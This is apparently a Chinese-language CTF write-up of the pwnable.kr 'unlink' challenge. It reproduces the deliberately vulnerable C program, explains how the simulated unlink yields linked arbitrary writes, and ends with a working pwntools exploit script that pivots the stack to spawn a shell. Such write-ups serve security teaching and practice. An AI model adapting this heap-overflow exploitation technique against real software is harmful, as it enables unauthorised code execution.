---
title: pwnable.kr之unlink
date: 2017-09-28 16:07:43
tags: 
 - pwnable.kr
 - heap
 - pwn
 - unlink
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
    struct tagOBJ* fd;
    struct tagOBJ* bk;
    char buf[8];
}OBJ;

void shell(){
    system("/bin/sh");
}

void unlink(OBJ* P){
    OBJ* BK;
    OBJ* FD;
    BK=P->bk;
    FD=P->fd;
    FD->bk=BK;
    BK->fd=FD;
}
int main(int argc, char* argv[]){
    malloc(1024);
    OBJ* A = (OBJ*)malloc(sizeof(OBJ));
    OBJ* B = (OBJ*)malloc(sizeof(OBJ));
    OBJ* C = (OBJ*)malloc(sizeof(OBJ));

    // double linked list: A <-> B <-> C
    A->fd = B;
    B->bk = A;
    B->fd = C;
    C->bk = B;

    printf("here is stack address leak: %p\n", &A);
    printf("here is heap address leak: %p\n", A);
    printf("now that you have leaks, get shell!\n");
    // heap overflow!
    gets(A->buf);

    // exploit this unlink!
    unlink(B);
    return 0;
}
```

这道题考查基础的堆溢出unlink利用, 其中实现的unlink函数是对早期ptmalloc的模拟. 程序给了堆栈的leak和获取shell的位置, 只需修改程序控制流即可.

这里定义的OBJ结构体指向chunk体部分, 不包含chunk头部分, 因此P->fd = *(P), P->bk = *(P + 4).

unlink主要的漏洞点发生在

    FD->bk=BK;
    BK->fd=FD;
两句,

FD->bk = P -> fd -> bk = BK = P -> bk, 亦即

```
*(*(P) + 4)=*(P+4)
```

我们假设内存布局为

A1|A2|A3|A4|B1|B2|B3|B4

则在unlink B的时候P->fd = A; P -> bk = B,

那么就有

```
*(B3 + 4) = B4;
*(B4) = B3;
```

可以看到, 这种unlink漏洞有两次任意内存写机会, 但是这个机会不是很好用, 因为两次写是有一定关联的. 最直观的想法就是把main函数ret地址写到B4, shell地址写到B3, 但是这样一来会向代码段非法写入. 接下来的一个想法是把一段足够短的跳板或者二次跳板程序写入到A3A4...(这是我们最早可控的内存), 然后通过控制ret跳转到堆上, 遗憾的是程序开启了数据执行保护, 堆上无法执行程序.

```
@hyrathon-vm ➜ Desktop  checksec unlink
[*] '/mnt/hgfs/Desktop/unlink'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

做到这里有一点卡壳了, 很羞耻的去网上找了一下writeup, 发现汇编中有这样一段栈很有趣:

![](unlink/1.png)

在退出main函数之前, 有一个mov ecx, [ebp-4]和lea esp, [ecx-4], 随后esp被恢复到eip. 既然没有办法直接控制ret, 可以通过控制ebp-4而控制ecx, 进而控制esp, eip

```
eip = esp
esp = ecx - 4
ecx = [ebp - 4]
```

我们想让eip=shell地址, 那么就应该控制ecx = shell地址+4, 即[ebp - 4] = shell地址 + 4, 而ebp - 4的地址可以通过stack_leak计算得来(经过实际验证为stack_leak + 0x10). shell地址则应该写在一个我们能控制的位置(堆上A3), 那么payload在堆上的布局就应该是

A1|A2|shell地址|padding|padding|padding|heap_leak + 0xc|stack_leak + 0x10

heap_leak + 0xc处0xc来自于shellcode地址本身与heap_leak相隔8, 加上ecx - 4时需要减4, 因此这里再加4.

```python
from pwn import *

p = process("./unlink")

p.recvuntil("here is stack address leak: ")
stack_address = int(p.recvline(), 16)
p.recvuntil("here is heap address leak: ")
heap_address = int(p.recvline(), 16)
p.recvuntil("now that you have leaks, get shell!")
print "stack_address:", hex(stack_address), "heap_address", hex(heap_address)

payload = p32(0x080484EB) + 'a'*12 + p32(heap_address + 0xc) + p32(stack_address + 0x10)

#gdb.attach(p)
p.sendline(payload)

p.interactive()
```


